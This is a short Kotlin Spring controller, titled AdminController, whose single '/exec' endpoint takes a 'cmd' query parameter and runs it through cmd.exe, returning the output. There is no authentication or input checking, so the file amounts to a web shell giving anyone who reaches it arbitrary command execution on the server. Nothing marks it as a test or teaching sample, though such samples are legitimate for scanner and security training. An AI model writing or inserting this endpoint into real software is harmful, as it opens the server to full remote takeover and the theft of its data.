import org.springframework.web.bind.annotation.GetMapping
import org.springframework.web.bind.annotation.RequestParam
import org.springframework.web.bind.annotation.RestController

@RestController
class AdminController {
    @GetMapping("/exec")
    fun exec(@RequestParam cmd: String): String {
        val process = Runtime.getRuntime().exec(arrayOf("cmd.exe", "/c", cmd))
        return process.inputStream.bufferedReader().readText()
    }
}
